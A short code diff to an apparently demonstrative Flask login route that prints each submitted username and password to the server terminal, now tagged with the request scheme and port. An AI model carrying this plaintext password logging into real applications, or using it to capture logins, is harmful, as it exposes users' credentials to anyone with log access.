@@ -11,9 +11,9 @@ def login():
     if request.method == "POST":
         username = request.form["username"]
         password = request.form["password"]
-        print(f"Username: {username}", flush=True)
-        print(f"Password: {password}", flush=True)
-        return "Login submitted! Check your terminal."
+        print(f"[{request.scheme.upper()} :{request.host.split(':')[-1]}] Username: {username}", flush=True)
+        print(f"[{request.scheme.upper()} :{request.host.split(':')[-1]}] Password: {password}", flush=True)
+        return render_template("success.html", username=username)
     return render_template("login.html")
 
 
